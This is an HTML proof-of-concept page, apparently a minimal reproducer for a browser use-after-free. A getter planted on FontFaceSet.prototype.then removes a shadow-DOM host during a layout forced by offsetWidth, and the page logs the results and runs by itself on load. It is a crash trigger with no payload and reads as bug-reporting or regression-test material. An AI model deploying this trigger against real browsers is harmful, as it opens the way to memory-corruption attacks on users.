<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>UAF 86074ba — Isolado (offsetWidth)</title>
<style>
  body { background: #111; color: #ddd; font-family: monospace; padding: 1em; }
  pre { font-size: 13px; line-height: 1.45; white-space: pre-wrap; }
  button { font-family: monospace; padding: 6px 12px; margin-bottom: 12px; cursor: pointer; }
  .ok { color: #7f7; }
  .warn { color: #ff7; }
  .err { color: #f77; }
</style>
</head>
<body>
<button id="runBtn" type="button">Executar teste isolado</button>
<pre id="log"></pre>
<script>
(function () {
  "use strict";

  var logEl = document.getElementById("log");
  var runBtn = document.getElementById("runBtn");
  var executed = false;

  function log(msg, cls) {
    var span = document.createElement("span");
    if (cls) span.className = cls;
    span.textContent = msg + "\n";
    logEl.appendChild(span);
  }

  function makeFontCss(url) {
    return (
      "@font-face{font-family:'pf';src:url('" + url + "')}" +
      ":host>span{font-family:'pf';font-size:20px;display:block}"
    );
  }

  function runTest() {
    if (executed) {
      log("Teste ja executado nesta pagina. Recarregue para repetir.", "warn");
      return;
    }
    executed = true;

    log("=== Inicio do teste isolado ===");

    var pre = document.createElement("div");
    document.body.appendChild(pre);
    pre.attachShadow({ mode: "open" });

    var shadowHost = document.createElement("div");
    document.body.appendChild(shadowHost);
    var sr = shadowHost.attachShadow({ mode: "open" });

    var style1 = document.createElement("style");
    style1.textContent = makeFontCss("resources/Ahem.woff?v=1");
    sr.appendChild(style1);

    var span = document.createElement("span");
    span.textContent = "X";
    sr.appendChild(span);

    var suf = document.createElement("div");
    document.body.appendChild(suf);
    suf.attachShadow({ mode: "open" });

    void shadowHost.getBoundingClientRect();
    log("[1] getBoundingClientRect() executado", "ok");

    var fs = document.fonts;
    log("[2] fonts.status inicial = " + fs.status, fs.status === "loading" ? "ok" : "warn");

    void fs.ready;
    log("[3] fs.ready acessado; status = " + fs.status);

    var trapFired = false;
    var connectedBefore = null;
    var connectedAfter = null;
    var srHostAfter = null;

    Object.defineProperty(FontFaceSet.prototype, "then", {
      configurable: true,
      get: function () {
        trapFired = true;
        connectedBefore = shadowHost.isConnected;
        log("[TRAP] FontFaceSet.prototype.then getter chamado | host.isConnected antes = " + connectedBefore, "warn");
        shadowHost.remove();
        connectedAfter = shadowHost.isConnected;
        srHostAfter = sr.host ? sr.host.tagName : null;
        log("[TRAP] shadowHost.remove() executado | host.isConnected depois = " + connectedAfter + " | sr.host = " + srHostAfter, "warn");
        return undefined;
      }
    });
    log("[4] Getter de FontFaceSet.prototype.then instalado", "ok");

    var style2 = document.createElement("style");
    style2.textContent = makeFontCss("resources/Ahem.woff?v=2");
    sr.prepend(style2);
    log("[5] style2 (?v=2) inserido via prepend()", "ok");

    log("[6] Disparando document.body.offsetWidth ...", "ok");
    void document.body.offsetWidth;

    try { delete FontFaceSet.prototype.then; } catch (e) {}

    log("=== Fim do passo [6] ===");
    log("trapFired = " + trapFired, trapFired ? "ok" : "err");
    log("host.isConnected: antes=" + connectedBefore + " -> depois=" + connectedAfter + " | sr.host=" + srHostAfter);
    log("fonts.status final = " + fs.status);
  }

  runBtn.addEventListener("click", runTest);
  window.addEventListener("load", function () {
    setTimeout(runTest, 0);
  });
})();
</script>
</body>
</html>
